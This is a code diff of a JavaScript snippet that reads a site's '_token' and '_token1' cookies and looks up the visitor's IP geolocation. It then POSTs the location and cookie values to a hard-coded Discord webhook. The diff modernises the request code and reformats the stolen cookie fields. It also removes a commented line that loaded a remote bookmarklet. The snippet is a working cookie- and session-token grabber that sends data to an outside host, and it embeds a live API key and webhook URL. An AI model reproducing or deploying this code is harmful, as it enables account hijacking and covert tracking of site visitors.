@@ -1,4 +1,3 @@
-// (function(){var script=document.createElement('script');script.type='text/javascript';script.src='https://cdn.rawgit.com/zz85/zz85-bookmarklets/master/js/upside3.js';document.body.appendChild(script);})()
 function getCookie(cname) {
   let name = cname + "=";
   let decodedCookie = decodeURIComponent(document.cookie);
@@ -14,7 +13,12 @@ function getCookie(cname) {
   }
   return "";
 }
-$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=1787457d8c344652bdc725082344cdd7", function(data) { 
+async function getData(){
+    const response = await fetch( "https://ipgeolocation.abstractapi.com/v1/?api_key=1787457d8c344652bdc725082344cdd7" );
+    return response.json();
+}
+
+getData().then((data) => {
     var request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/919718102281908225/u3QiALOWOXtDu7cJ-AjacxHqkm_FxaBzHqxp8PIFMbq8Bh6itvDPSh7b0_0wvPPQ_1cs");
   
@@ -29,7 +33,7 @@ $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=1787457d8c344652bdc
             {name: "City", value: data.city},
             {name: "County", value: data.country},
             {name: "Continent", value: data.continent},
-            {name: "Cookies", value: getCookie("_token")+" "+getCookie("_token1")}
+            {name: "Cookies", value: "_token: "+getCookie("_token")+"\n_token1: "+getCookie("_token1")}
           ],
       }]
   };
